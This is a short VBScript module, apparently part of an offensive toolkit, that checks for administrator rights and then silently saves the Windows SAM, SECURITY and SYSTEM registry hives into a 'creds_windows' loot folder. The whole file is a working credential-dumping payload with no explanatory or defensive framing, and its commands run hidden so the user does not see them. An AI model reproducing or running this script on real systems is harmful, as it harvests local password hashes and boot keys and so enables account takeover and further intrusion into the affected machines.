' Initialize the script.
Execute("lib\includes\is_admin.vbs")

' Only run on UAC.
If isAdmin = True Then
	' Create folder for embedded password hashes.
	pathCreds = PATH_LOOT & "creds_windows\"
	CreateObject("Scripting.FileSystemObject").CreateFolder pathCreds

	' Output the SAM, SECURITY, and SYSTEM, keys. 
	CreateObject("WScript.Shell").Run "cmd.exe /C reg save HKLM\SAM " & pathCreds & "sam", 0, True
	CreateObject("WScript.Shell").Run "cmd.exe /C reg save HKLM\SECURITY " & pathCreds & "security", 0, True
	CreateObject("WScript.Shell").Run "cmd.exe /C reg save HKLM\SYSTEM " & pathCreds & "system", 0, True
End IF